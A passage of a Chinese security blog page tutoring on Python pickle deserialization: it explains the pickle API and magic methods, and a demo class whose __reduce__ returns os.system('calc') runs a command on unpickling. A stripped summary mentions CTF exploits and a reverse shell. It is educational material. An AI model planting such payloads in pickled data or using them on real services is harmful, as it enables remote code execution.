际使用时首先需要有大概的思路保证能做到手写每一步的然后使用对思路进行实现华北赛区首先是一个脚本爆破首页告诉我们要卖到那我们首先得找到它由于页面很多手动不现实故此需要脚本找找到如上图在页我们访问看看我们在结算的时候抓包看看如上图我们修改折扣进行购买随后看到右侧有个重定向我们访问看看看到这里只允许访问又看到其中有那毫无疑问就是伪造了那首先我们先要拿到这里也是看发现是通过爆破找到的直接上工具链接用法这里就不赘述了如上图可以看到是如上图进行伪造之后发送到发送之后是如下页面成功以身份登录接下来看一下源代码发现存在我们下载看看如果我们上述成功的话就会得到源码我们找到看到如下代码分析可以知道只有我们用户为随后向进行传参内容为序列化内容之后由于的存在我们可以执行恶意代码如下注意上述题目中的参数是经过函数处理的之后在环境下运行向传参即可这里点击页面的一键成为大会员之后抓包修改参数拿到自动化工具是一款旨在查找代码中常见安全问题的工具为此处理每个文件从中构建并针对节点运行适当的插件一旦完成扫描所有文件它就会生成一份报告我们可以利用上述工具来进行自动的代码审计看看上述工具是否可以分析出来源码中含有漏洞需要分析的文件路径如上图的确跟我们手工分析的注入点一致刚开始提示我们要买这个东西但我用抓包只是发现了以及在变化看着像但解密却是一堆乱码于是看了发现这是先序列化后在解密的那就好办了写一个简单脚本即可解密出来为这里看到个搜了搜是个算法什么的也没具体了解就看了这里他们说这种算法也没法利用了可以直接将一段恶意的代码编码后放到进行因为这里是环境内部靶机不出网所以也懒得去开小号啥的就看个思路如下输出之后反弹成功进行即可参考其他方法可也参考总的来说学反序列化任重而道远虽然总结了这么多但消化的感觉挺少以后会多找点这种题目的继续更新这篇文章毕竟质量太辣鸡参考文章反序列化初探反序列化漏洞分析最近碰到的反序列化小总结可参考反序列化利用反序列化覆盖秘钥的第二种解法',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-04-07 19:58:36',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" itemprop="url">web知识总结</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>基本知识</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Pickle反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-11-14T10:51:00.692Z" title="发表于 2023-11-14 18:51:00">2023-11-14</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-04-07T11:58:36.233Z" title="更新于 2024-04-07 19:58:36">2024-04-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">16.7k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>65分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Pickle反序列化"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/11/14/pickle-fan-xu-lie-hua-xue-xi/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/11/14/pickle-fan-xu-lie-hua-xue-xi/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/11/14/pickle-fan-xu-lie-hua-xue-xi/"><header><a class="post-meta-categories" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" itemprop="url">web知识总结</a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" tabindex="-1" itemprop="url">基本知识</a><h1 id="CrawlerTitle" itemprop="name headline">Pickle反序列化</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-11-14T10:51:00.692Z" title="发表于 2023-11-14 18:51:00">2023-11-14</time><time itemprop="dateCreated datePublished" datetime="2024-04-07T11:58:36.233Z" title="更新于 2024-04-07 19:58:36">2024-04-07</time></header><h1 id="0x01-前言">0x01 前言</h1>
<p>之前学的反序列化一直是围绕PHP的，近期刷题也遇到pickle反序列化，故此学习一番，唉，Python反序列化都难，更别说Java了┭┮﹏┭┮</p>
<h1 id="0x02-简介">0x02 简介</h1>
<p><code>Python</code>的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输, 然后使用的时候再将字节流转化回原始的对象的一个过程, 这个和其他语言的序列化与反序列化其实都差不多.</p>
<p><code>Python</code>中序列化一般有两种方式: <code>pickle</code>模块和<code>json</code>模块, 前者是<code>Python</code>特有的格式, 后者是<code>json</code>通用的格式.</p>
<p>相较于<code>PHP</code>反序列化灵活多样的利用方式, 例如<code>POP</code>链构造, <code>Phar</code>反序列化, 原生类反序列化以及字符逃逸等. <code>Python</code>相对而言没有<code>PHP</code>那么灵活, 关于反序列化漏洞主要涉及这么几个概念: <code>pickle</code>, <code>pvm</code>, <code>__reduce__</code>魔术方法。</p>
<h1 id="0x03-pickle">0x03 Pickle</h1>
<h2 id="31-基础知识">3.1 基础知识</h2>
<p><code>Pickle</code>可以用于<code>Python</code>特有的类型和<code>Python</code>的数据类型间进行转换(所有<code>Python</code>数据类型).</p>
<p><code>Python</code>提供两个模块来实现序列化: <code>cPickle</code>和<code>pickle</code>. 这两个模块功能是一样的, 区别在于<code>cPickle</code>是<code>C</code>语言写的, 速度快; <code>pickle</code>是纯<code>Python</code>写的, 速度慢. 在<code>Python3</code>中已经没有<code>cPickle</code>模块. <code>pickle</code>有如下四种操作方法:</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>dump</td>
<td>对象序列化到文件对象并存入文件</td>
</tr>
<tr>
<td>dumps</td>
<td>对象序列化为 bytes 对象（字符串格式的字节流）</td>
</tr>
<tr>
<td>load</td>
<td>对象反序列化并从文件中读取数据</td>
</tr>
<tr>
<td>loads</td>
<td>从 bytes 对象（字符串格式的字节流）反序列化</td>
</tr>
</tbody>
</table>
<pre><code class="hljs py">pickle.dump(*obj*, *file*, *protocol=<span class="hljs-literal">None</span>*, ***, *fix_imports=<span class="hljs-literal">True</span>*)</code></pre>
<p>将打包好的对象 <em>obj</em> 写入文件中，其中protocol为pickling的协议版本（下同）。</p>
<pre><code class="hljs py">pickle.dumps(*obj*, *protocol=<span class="hljs-literal">None</span>*, ***, *fix_imports=<span class="hljs-literal">True</span>*)</code></pre>
<p>将 <em>obj</em> 打包以后的对象作为<code>bytes</code>类型直接返回。</p>
<pre><code class="hljs py">pickle.load(*file*, ***, *fix_imports=<span class="hljs-literal">True</span>*, *encoding=<span class="hljs-string">"ASCII"</span>*, *errors=<span class="hljs-string">"strict"</span>*)</code></pre>
<p>从文件中读取二进制字节流，将其反序列化为一个对象并返回。</p>
<pre><code class="hljs py">pickle.loads(*data*, ***, *fix_imports=<span class="hljs-literal">True</span>*, *encoding=<span class="hljs-string">"ASCII"</span>*, *errors=<span class="hljs-string">"strict"</span>*)</code></pre>
<p>从data中读取二进制字节流，将其反序列化为一个对象并返回。</p>
<pre><code class="hljs py"><span class="hljs-built_in">object</span>.__reduce__()</code></pre>
<p><code>__reduce__()</code>其实是object类中的一个魔术方法，我们可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。</p>
<p>Python要求该方法必须返回一个字符串或者元组。如果返回元组<code>(callable, ([para1,para2...])[,...])</code> ，那么每当该类的对象被反序列化时，该<code>callable</code>就会被调用，参数为<code>para1、para2...</code></p>
<p>这里在强调一下这个基础知识：</p>
<ul>
<li>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。</li>
<li>python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。</li>
<li>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型。</li>
<li>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</li>
</ul>
<h2 id="32-可序列化的对象">3.2 可序列化的对象</h2>
<ul>
<li><code>None</code> 、 <code>True</code> 和 <code>False</code></li>
<li>整数、浮点数、复数</li>
<li>str、byte、bytearray</li>
<li>只包含可封存对象的集合，包括 tuple、list、set 和 dict</li>
<li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</li>
<li>定义在模块最外层的内置函数</li>
<li>定义在模块最外层的类</li>
<li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）</li>
</ul>
<h2 id="33-object__reduce__-函数">3.3 <code>object.__reduce__()</code> 函数</h2>
<ul>
<li>在开发时，可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 <code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</li>
<li>在下文pickle的opcode中， <code>R</code> 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 <code>R</code> 正好对应 <code>object.__reduce__()</code> 函数， <code>object.__reduce__()</code> 的返回值会作为 <code>R</code> 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 <code>R</code> 的。</li>
</ul>
<h2 id="34-魔术方法">3.4 魔术方法</h2>
<pre><code class="hljs scss"><span class="hljs-built_in">__reduce__</span>() 反序列化时调用
<span class="hljs-built_in">__reduce_ex__</span>() 反序列化时调用 <span class="hljs-comment">//上面的升级版</span>
<span class="hljs-built_in">__setstate__</span>() 反序列化时调用
<span class="hljs-built_in">__getstate__</span>() 序列化时调用</code></pre>
<p>这里用一个小迪的Demo来体会一下上述魔术方法的作用</p>
<h3 id="__reduce__"><code>__reduce__()</code></h3>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> os

<span class="hljs-comment">#反序列化魔术方法调用-__reduce__() __reduce_ex__() __setstate__()</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'反序列化调用'</span>)
        <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">'calc'</span>,))
a = A()
p_a = pickle.dumps(a)
pickle.loads(p_a)
<span class="hljs-built_in">print</span>(<span class="hljs-string">'=========='</span>)
<span class="hljs-built_in">print</span>(p_a)</code></pre>
<p>上述先实例化一个a对象，接着对a对象进行dumps序列化，然后loads对a序列化后的字节流数据进行反序列化，最后打印出a序列化后的字节流数据。</p>
<p>注意这里的<code>__reduce__</code>魔术方法在反序列化时（也就是调用loads函数时）会被自动调用，随后打印一段字符，接着调用system执行calc命令，结果如下图。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231213184734661.png" alt="image-20231213184734661"></p>
<p>我们将上述loads注释掉，会发现没有调用计算器，但却执行了reduce中的print函数，这里我就懵逼了，不是说只有loads反序列化时才会调用reduce方法吗。接着问了一下GPT发现：</p>
